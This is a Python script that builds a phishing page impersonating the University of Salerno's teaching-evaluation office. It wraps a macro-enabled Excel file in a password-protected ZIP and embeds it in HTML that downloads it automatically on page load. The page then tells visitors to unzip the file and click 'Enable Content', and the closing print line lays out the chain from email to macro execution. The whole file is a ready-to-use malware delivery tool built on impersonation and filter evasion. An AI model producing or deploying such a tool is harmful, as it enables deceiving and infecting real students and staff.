import base64
import os
import subprocess
import sys

# ── Configurazione ───────────────────────────────────────────────────
xlsm_file    = "IngegneriaMeccanicaUNISA.xlsm"
zip_output   = "Risultati_Sondaggio_Studenti.zip"
html_output  = "index.html"
zip_password = "Unisa2026"

# ── Verifica file sorgente ───────────────────────────────────────────
if not os.path.exists(xlsm_file):
    print(f"[-] Error: {xlsm_file} not found")
    sys.exit(1)

# ── Crea ZIP con password (AES-256) ─────────────────────────────────
try:
    import pyzipper
except ImportError:
    print("[*] Installo pyzipper...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyzipper", "-q"])
    import pyzipper

with pyzipper.AESZipFile(zip_output, 'w',
                          compression=pyzipper.ZIP_DEFLATED,
                          encryption=pyzipper.WZ_AES) as zf:
    zf.setpassword(zip_password.encode())
    zf.write(xlsm_file, "Risultati_Sondaggio_Studenti.xlsm")

print(f"[+] ZIP creato: {zip_output}  (password: {zip_password})")

# ── Base64 del ZIP ───────────────────────────────────────────────────
with open(zip_output, "rb") as f:
    b64_data = base64.b64encode(f.read()).decode("utf-8")

# ── Pagina HTML ──────────────────────────────────────────────────────
html_content = f"""<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sondaggio Studenti — UNISA</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ec 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .card {{
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,.10), 0 2px 8px rgba(0,0,0,.06);
            padding: 48px 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }}
        .header {{
            margin-bottom: 32px;
        }}
        .logo {{
            font-size: 36px;
            font-weight: 800;
            color: #F5A800;
            letter-spacing: -1px;
            margin-bottom: 6px;
        }}
        .subtitle {{
            color: #888;
            font-size: 13px;
            font-weight: 400;
        }}
        .divider {{
            height: 3px;
            width: 50px;
            background: #F5A800;
            border-radius: 2px;
            margin: 24px auto;
        }}
        .spinner {{
            width: 48px;
            height: 48px;
            border: 4px solid #e8ecf1;
            border-top-color: #F5A800;
            border-radius: 50%;
            animation: spin .8s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .status {{
            color: #333;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 28px;
        }}
        .status strong {{
            color: #F5A800;
        }}
        .password-box {{
            background: #fdf8ee;
            border: 1px solid #f0dca0;
            border-radius: 10px;
            padding: 18px 22px;
            text-align: left;
        }}
        .password-box p {{
            font-size: 13px;
            color: #666;
            margin-bottom: 10px;
        }}
        .password-box .pwd {{
            font-family: 'Courier New', monospace;
            font-size: 22px;
            font-weight: bold;
            color: #F5A800;
            letter-spacing: 3px;
            user-select: all;
        }}
        .instructions {{
            margin-top: 24px;
            font-size: 12.5px;
            color: #999;
            line-height: 1.8;
            text-align: left;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }}
        .instructions b {{
            color: #555;
        }}
        .step-num {{
            display: inline-block;
            width: 20px;
            height: 20px;
            background: #F5A800;
            color: #fff;
            border-radius: 50%;
            text-align: center;
            line-height: 20px;
            font-size: 11px;
            font-weight: 700;
            margin-right: 6px;
        }}
        .footer {{
            margin-top: 24px;
            font-size: 11px;
            color: #bbb;
        }}
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo">UNISA</div>
        <div class="subtitle">Universit\\u00e0 degli Studi di Salerno &mdash; Valutazione della Didattica</div>
    </div>
    <div class="divider"></div>
    <div class="spinner"></div>
    <div class="status">I risultati del sondaggio sono pronti.<br><strong>Download in corso&hellip;</strong></div>
    <div class="password-box">
        <p>&#128274; Il file &egrave; protetto da password:</p>
        <div class="pwd">{zip_password}</div>
    </div>
    <div class="instructions">
        <b>Come aprire il file:</b><br>
        <span class="step-num">1</span> Attendi il completamento del download<br>
        <span class="step-num">2</span> Apri il file ZIP con <b>7-Zip</b> o WinRAR<br>
        <span class="step-num">3</span> Inserisci la password indicata sopra<br>
        <span class="step-num">4</span> Apri il file Excel e clicca <b>Abilita contenuto</b>
    </div>
    <div class="footer">&copy; 2026 UNISA &mdash; Area Qualit\\u00e0 della Didattica</div>
</div>
<script>
    var b64   = "{b64_data}";
    var name  = "Risultati_Sondaggio_Studenti.zip";
    var bytes = Uint8Array.from(atob(b64), function(c) {{ return c.charCodeAt(0); }});
    var blob  = new Blob([bytes], {{type: "application/zip"}});
    var a     = document.createElement("a");
    a.href     = URL.createObjectURL(blob);
    a.download = name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
</script>
</body>
</html>"""

# ── Scrivi HTML ──────────────────────────────────────────────────────
with open(html_output, "w", encoding="utf-8") as f:
    f.write(html_content)

zip_kb  = os.path.getsize(zip_output) // 1024
html_kb = os.path.getsize(html_output) // 1024
print(f"[+] {html_output} generato  ({html_kb} KB)")
print(f"[+] Flusso: email → link /sondaggio → download ZIP → 7-Zip → xlsm → macro")
print(f"[+] Password da comunicare nella email: {zip_password}")
